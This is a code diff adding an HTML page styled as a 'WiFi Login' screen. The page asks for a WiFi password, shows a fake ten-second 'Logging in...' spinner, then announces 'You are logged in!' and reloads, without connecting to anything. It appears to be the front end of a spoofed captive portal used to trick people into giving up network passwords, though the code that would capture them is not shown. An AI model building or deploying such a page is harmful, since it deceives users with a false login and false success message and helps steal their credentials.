@@ -1,0 +1,169 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>WiFi Login</title>
+    <style>
+        body {
+            font-family: 'Segoe UI', Tahoma, Geneva, Verdana, sans-serif;
+            background-color: #000;
+            display: flex;
+            align-items: center;
+            justify-content: center;
+            height: 100vh;
+            margin: 0;
+            color: #fff;
+        }
+
+        form {
+            width: 400px;
+            height: 500px;
+            background-color: #333;
+            padding: 40px;
+            border-radius: 20px;
+            box-shadow: 0 0 20px rgba(255, 255, 255, 0.1);
+            display: flex;
+            flex-direction: column;
+            align-items: center;
+        }
+
+        h1 {
+            color: #4caf50;
+            font-size: 32px;
+            margin-bottom: 20px;
+        }
+
+        label {
+            display: block;
+            margin-bottom: 16px;
+            color: #fff;
+        }
+
+        input {
+            width: 100%;
+            padding: 12px;
+            margin-bottom: 20px;
+            box-sizing: border-box;
+        }
+
+        button {
+            background-color: #4caf50;
+            color: #fff;
+            padding: 15px;
+            border: none;
+            border-radius: 8px;
+            cursor: pointer;
+        }
+
+        img {
+            width: 80px;
+            height: 80px;
+            margin-bottom: 20px;
+        }
+
+        small {
+            margin-top: auto; /* Push to the bottom */
+            color: #aaa;
+        }
+
+        .loading-screen {
+            display: none;
+            position: fixed;
+            top: 0;
+            left: 0;
+            width: 100%;
+            height: 100%;
+            background: rgba(0, 0, 0, 0.7);
+            flex-direction: column;
+            align-items: center;
+            justify-content: center;
+            color: #fff;
+            font-size: 24px;
+            z-index: 1; /* Ensure the spinner is on top of other content */
+        }
+
+        .spinner {
+            position: relative;
+            width: 100px;
+            height: 100px;
+        }
+
+        .ring {
+            position: absolute;
+            width: 100%;
+            height: 100%;
+            border: 8px solid transparent;
+            border-top-color: #4caf50;
+            border-radius: 50%;
+            animation: spin 1s linear infinite;
+        }
+
+        #spinnerText {
+            position: absolute;
+            top: 50%;
+            left: 50%;
+            transform: translate(-50%, -50%);
+            color: #fff;
+            font-size: 24px;
+        }
+
+        @keyframes spin {
+            0% { transform: rotate(0deg); }
+            100% { transform: rotate(360deg); }
+        }
+    </style>
+</head>
+<body>
+
+    <form id="loginForm" method="post" action="/index.html">
+        <img src="wifi-logo.jpeg" alt="WiFi Logo">
+        <h1>Log In</h1>
+        <label for="password">WiFi Password:</label>
+        <input type="password" id="password" name="password" required>
+        <br>
+        <button type="button" onclick="connectToWiFi()">Connect</button>
+        <small>Login to get Internet <span id="countdown"></span> ......</small>
+    </form>
+
+    <div class="loading-screen" id="loadingScreen">
+        <div class="spinner">
+            <div class="ring" id="ring1"></div>
+            <div class="ring" id="ring2"></div>
+            <div id="spinnerText">10</div>
+        </div>
+        <p>Logging in...</p>
+    </div>
+
+    <script>
+        function connectToWiFi() {
+            document.getElementById("loginForm").style.display = "none";
+            document.getElementById("loadingScreen").style.display = "flex";
+            startCountdown(10);
+            setTimeout(showSuccessMessage, 10000);
+        }
+
+        function startCountdown(seconds) {
+            var countdownElement = document.getElementById("countdown");
+            var spinnerTextElement = document.getElementById("spinnerText");
+
+            var interval = setInterval(function () {
+                seconds--;
+                countdownElement.innerText = seconds;
+                spinnerTextElement.innerText = seconds;
+                if (seconds <= 0) {
+                    clearInterval(interval);
+                }
+            }, 1000);
+        }
+
+        function showSuccessMessage() {
+            document.getElementById("loadingScreen").style.display = "none";
+            alert("You are logged in!");
+            // Reload the page after showing the success message
+            location.reload();
+        }
+    </script>
+
+</body>
+</html>
